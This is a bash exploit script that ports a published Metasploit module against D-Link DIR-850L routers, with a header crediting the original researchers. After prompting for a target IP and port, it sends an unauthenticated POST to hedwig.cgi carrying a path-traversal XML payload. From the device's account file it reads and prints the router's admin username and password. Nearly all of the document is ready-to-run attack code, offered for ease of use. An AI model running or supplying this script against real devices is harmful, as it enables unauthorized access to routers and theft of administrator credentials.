#!/bin/bash
#
# Derped together by Raphael de la Vienne A.K.A. Hackdwerg
# Original exploit https://www.rapid7.com/db/modules/exploit/linux/http/dlink_dir850l_unauth_exec
# Just in case if you dont have metasploit, or are to lazy to install it. here is a bash variant.
#
# Exploit Title: dlink-850-admin-creds-retriever.sh
# Google Dork: none
# Date: 2017-11-23
# Exploit Author: Zdenda, Peter Geissler, Pierre Kim
# Ported to bash for the ease of use. 
# Vendor Homepage: http://support.dlink.com/ProductInfo.aspx?m=DIR-850L
# Software Link: ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP
# Version: 1.14.B07
# Tested on: mips
# SSV ID:SSV-96333
# CVE : none
# Original PoC: https://www.seebug.org/vuldb/ssvid-96333
# MSF module: https://www.rapid7.com/db/modules/exploit/linux/http/dlink_dir850l_unauth_exec

# Vulnerability found in Hack2Win competition at securiteam
# URL: https://blogs.securiteam.com/index.php/archives/3364
# Credits go to Zdenda, Peter Geissler and Pierre Kim
# Recreated in bash by Hackdwerg
# Usage: enter ip when prompted, enter port when prompted. 

#input IP
echo -e "Enter DLINK IP"
read IP
#input PORT
echo -e "Enter PORT number"
read PORT
#generate Random UID cookie
SET_COOKIE=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
#setting headers
        HEADER1="User-Agent:Mozilla/4.0 (compatible; MSIE 5.5;Windows NT)"
        HEADER2="Content-Type:text/xml"
        HEADER3="Accept-Encoding:gzip, deflate"
        HEADER4="Cookie:uid=$SET_COOKIE"
        HEADER5="Connection:close"
#Build XML
XML_DATA="<?xml version='1.0' encoding='utf-8'?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>"
#Create POST with variables
POST=$(curl -s -X POST http://$IP:$PORT/hedwig.cgi -H "$HEADER1" -H "$HEADER2" -H "$HEADER3" -H "$HEADER4" -H "$HEADER5" -H "text/xml" -d "$XML_DATA")
OUT_RAW=$(echo $POST > Dlink-$IP-RAW.xml)
echo "output saved in: Dlink-$IP-RAW.xml"
#lazy solution for getting name and password. (if it works it aint stupid)
PRETTYFAIUSER=$(cat Dlink-$IP-RAW.xml | sed -e 's,.*<name>\([^<]*\)</name>.*,\1,g')
PRETTYFAIPASS=$(cat Dlink-$IP-RAW.xml | sed -e 's,.*<password>\([^<]*\)</password>.*,\1,g')

echo "Username =" $PRETTYFAIUSER
echo "Password =" $PRETTYFAIPASS
echo ""
echo "kthankxbye"

